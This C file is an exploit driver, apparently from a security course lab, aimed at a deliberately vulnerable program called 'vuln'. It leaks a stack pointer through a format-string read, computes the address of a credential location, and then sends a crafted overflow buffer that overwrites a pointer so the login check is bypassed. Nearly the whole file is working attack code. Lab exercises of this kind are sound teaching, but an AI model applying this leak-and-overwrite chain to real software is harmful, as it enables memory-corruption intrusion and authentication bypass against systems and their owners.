#include <sys/wait.h>
#include "driver_base.h"
#include "constants.h"

int main(int argc, char* argv[]) {
	char *nargv[3] = { "vuln", STRINGIFY(GRP), NULL };

	// Fork subprocess vuln
	create_subproc("./vuln", nargv);
	fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
			"vuln, go ahead and do that now. Press 'enter' when you are ready\n"
			"to continue with the exploit\n");
	getchar();
	get_formatted("%*s"); // Needed to clear out the Welcome message

	// Function to probe and find the location of main bp
	// probe_stack(200, 500);

	// The probed value on the stack is 218 for the saved rbp value in main loop
	put_str("e %218$p\n");
	send();
	uint64_t cur_main_bp;
	get_formatted("%p", &cur_main_bp);
	fprintf(stderr, "driver: Extracted cur_main_bp=%lx\n", cur_main_bp);

	// Compute the information for the current run using the probed values
	uint64_t cur_auth_bp = cur_main_bp + auth_main_bp_dist;
	uint64_t cur_auth_cred_loc = cur_auth_bp + auth_bp_cred_loc_dist;
	fprintf(stderr, "driver: Computed cur_auth_bp=%lx, cur_auth_cred_loc=%lx\n", 
			cur_auth_bp, cur_auth_cred_loc);

	// Send the payload
	put_str("p 1234567\n");
	send();
	get_formatted("%*s");

	// Buffer Size + DB - Password
	unsigned explsz = auth_db_cred_dist + 8 - 8;
	void* *expl = (void**)malloc(explsz);

	// Initialize the buffer with '\1' to make the contents predictable.
	memset((void*)expl, '\1', explsz);
	expl[auth_db_cred_dist/sizeof(void*)-1] = (void*)cur_auth_cred_loc;

	put_str("u ");
	put_bin((char*)expl, explsz);
	put_str("\n");
	send();
	get_formatted("%*s");
	put_str("l \n");
	send();

	usleep(100000);
	get_formatted("%*s");

	kill(pid, SIGINT);

	int status;
	wait(&status);
	display_vuln_status(status);
}
